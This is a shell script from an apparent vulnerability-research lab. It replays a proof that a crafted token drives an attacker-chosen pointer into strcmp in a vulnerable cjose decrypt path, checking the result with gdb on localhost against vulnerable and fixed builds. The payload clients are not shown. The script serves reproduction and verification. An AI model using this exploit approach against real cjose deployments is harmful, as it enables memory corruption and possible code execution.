#!/bin/sh
# One-command clean-archive replay of the cjose2shell W199 rung-4 limb.
#
# From a fresh archive of committed source only, e.g.:
#   git archive HEAD lab/frontier/cjose2shell | tar x -C /tmp/cjose-w199
#   cd /tmp/cjose-w199/lab/frontier/cjose2shell && sh replay-w199.sh
#
# Offline. Rebuilds jansson and all pinned cjose trees from the committed
# tarballs, verifies PINS.sha256, runs the 48-invocation direct-call check,
# then drives the loopback HTTP consumer with the W199 pointer token. Every
# server is an ephemeral 127.0.0.1 port opened by one w1 process per case;
# no listener remains. The gdb pointer-dereference case is stochastic because
# jansson seeds its hashtable from /dev/urandom (W183): this script retries a
# bounded number of times and asserts that at least one run dereferenced the
# wire-chosen value, rather than asserting a fixed fault fraction.
# Expected terminal line: REPLAY_W199_OK
set -eu

HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
ROOT=$HERE
OUT=$HERE/evidence-replay-w199
mkdir -p "$OUT"

(cd "$ROOT" && sha256sum -c PINS.sha256 > /dev/null)

"$ROOT/harness/bootstrap.sh"
grep -qF 'PASS=223 FAIL=0' "$ROOT/harness/evidence/summary.txt"

(cd "$ROOT/w1" && sh build.sh)

# Start one loopback consumer, wait for its PORT= line, send one request.
# Usage: drive BIN CLIENT LOG SCENARIO [gdb]
drive() {
    bin=$1; client=$2; log=$3; scenario=$4; mode=${5:-plain}
    : > "$log"
    if [ "$mode" = gdb ]; then
        timeout 25 gdb -q -batch -ex 'set pagination off' -ex run \
            -ex 'bt 8' -ex 'info registers rip rdi' \
            --args "./$bin" > "$log" 2>&1 &
    else
        "./$bin" > "$log" 2>&1 &
    fi
    pid=$!
    port=""
    poll=0
    while [ "$poll" -lt 200 ]; do
        port=$(grep -m1 '^PORT=' "$log" 2>/dev/null | cut -d= -f2 || true)
        [ -n "$port" ] && break
        sleep 0.05
        poll=$((poll + 1))
    done
    if [ -z "$port" ]; then
        kill "$pid" 2>/dev/null || true
        wait "$pid" 2>/dev/null || true
        return 1
    fi
    if [ "$client" = ptr-client.py ]; then
        python3 "$client" 127.0.0.1 "$port" >> "$log" 2>&1 || true
    else
        python3 "$client" 127.0.0.1 "$port" "$scenario" >> "$log" 2>&1 || true
    fi
    wait "$pid" 2>/dev/null || true
    return 0
}

cd "$ROOT/w1"

# Control: fixed build rejects the same pointer token before the write.
drive w1-plain-fixed ptr-client.py "$OUT/fixed-ptr.log" ""
grep -qF 'DECRYPT=0 ERRCODE=1' "$OUT/fixed-ptr.log"
grep -qF 'CEK_LEN_AFTER=32' "$OUT/fixed-ptr.log"

# Control: safe token on the vulnerable build keeps the declared CEK length.
drive w1-plain-vuln client.py "$OUT/vuln-valid.log" valid
grep -qF 'CEK_LEN_AFTER=32' "$OUT/vuln-valid.log"

# Vulnerable build with the pointer token: at least one run must report the
# oversized CEK length when it does not fault.
saw_len=0
attempt=1
while [ "$attempt" -le 8 ]; do
    if drive w1-plain-vuln ptr-client.py "$OUT/vuln-ptr-$attempt.log" ""; then
        if grep -qF 'CEK_LEN_AFTER=72' "$OUT/vuln-ptr-$attempt.log"; then saw_len=1; fi
    fi
    attempt=$((attempt + 1))
done
[ "$saw_len" -eq 1 ]

# The decisive limb: a wire-chosen value reaches the pointer passed to strcmp
# in the real decrypt path. 20 gdb attempts make a missed stochastic seed
# unlikely (W199 measured 8/40 plain faults).
saw_ptr=0
attempt=1
while [ "$attempt" -le 20 ]; do
    if drive w1-plain-vuln ptr-client.py "$OUT/gdb-ptr-$attempt.log" "" gdb; then
        if grep -qF 'enc=0x4141414141414141' "$OUT/gdb-ptr-$attempt.log" && \
           grep -qF '0x4141414141414141' "$OUT/gdb-ptr-$attempt.log"; then
            saw_ptr=1
            cp "$OUT/gdb-ptr-$attempt.log" "$OUT/gdb-pointer-deref.log"
            break
        fi
    fi
    attempt=$((attempt + 1))
done
[ "$saw_ptr" -eq 1 ]

echo REPLAY_W199_OK
